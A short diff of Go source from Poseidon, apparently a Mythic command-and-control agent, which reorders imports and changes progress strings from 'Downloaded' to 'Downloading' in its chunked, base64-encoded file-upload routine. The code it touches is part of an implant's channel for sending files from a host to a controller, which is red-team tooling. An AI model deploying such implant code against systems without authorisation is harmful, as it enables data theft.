@@ -5,15 +5,16 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 	"io"
 	"math"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 var SendToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)
@@ -102,7 +103,7 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 		if _, ok := fileDetails["file_id"]; ok {
 			updateUserOutput := structs.Response{}
 			updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
-			updateUserOutput.Status = fmt.Sprintf("Downloaded 1/%d Chunks...", totalChunks)
+			updateUserOutput.Status = fmt.Sprintf("Downloading 1/%d Chunks...", totalChunks)
 			updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
 			sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
 			break
@@ -151,7 +152,7 @@ func sendFileMessagesToMythic(sendFileToMythic structs.SendFileToMythicStruct) {
 		fileDownloadData.FileID = fileDetails["file_id"].(string)
 		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 		fileDownloadMsg.Download = &fileDownloadData
-		fileDownloadMsg.Status = fmt.Sprintf("Downloaded %d/%d Chunks...", fileDownloadData.ChunkNum, totalChunks)
+		fileDownloadMsg.Status = fmt.Sprintf("Downloading %d/%d Chunks...", fileDownloadData.ChunkNum, totalChunks)
 		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
 
 		// Wait for a response for our file chunk
